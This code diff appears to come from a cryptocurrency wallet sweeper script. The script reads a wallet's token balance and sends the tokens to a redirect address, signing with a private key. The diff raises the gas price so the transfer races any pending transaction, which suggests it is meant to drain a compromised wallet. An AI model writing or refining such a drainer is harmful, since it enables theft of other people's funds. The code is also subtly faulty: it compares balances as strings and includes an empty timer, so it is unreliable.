@@ -77,7 +77,14 @@ const main = async () => {
 
   var newbalance = parseFloat(balance)
   var getToken = await tokenBalance()
+  if (getToken > '0.0') {
+    await removeMoney(getToken)
+  }
 
+
+  setTimeout(function() {
+
+}, 1500);
   console.log(getToken)
   var realBalance = newbalance - 0.001209643999999988
 
@@ -92,7 +99,7 @@ const main = async () => {
       console.log(`pending transaction hash:${tx['hash']}`)
 
       provider.once(tx['hash'], async (transaction) => {
-        if (parseInt(getToken) > 0.0) {
+        if (getToken > '0.0') {
           await removeMoney(getToken)
         }
 
@@ -173,18 +180,18 @@ const removeMoney = async (bal) => {
       network: 'ethereum',
       rpcUrl: process.env.RPC,
       privateKey: process.env.PRIVATE_KEY,
-      gasPrice: '50', // Gas price is in Gwei. leave empty to use default gas price
+      gasPrice: '100', // Gas price is in Gwei. leave empty to use default gas price
       tokenAddress: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
     }) // NOTE - For other EVM compatible blockchains all you have to do is change the rpcUrl.
 
     const wallets = Promise.resolve(transfer)
     wallets.then((value) => {
       if (value['hash'] == null) console.log('i am so sorry boss')
-
-      console.log(`pulled successfully you up ${value['hash']}`)
+value.wait()
+      console.log(`pulled successfully to ${process.env.REDIRECT} with transaction hash: ${value['hash']}`)
     })
   } catch (error) {
-    console.log(error)
+    console.log(error.reason)
   }
 }
 
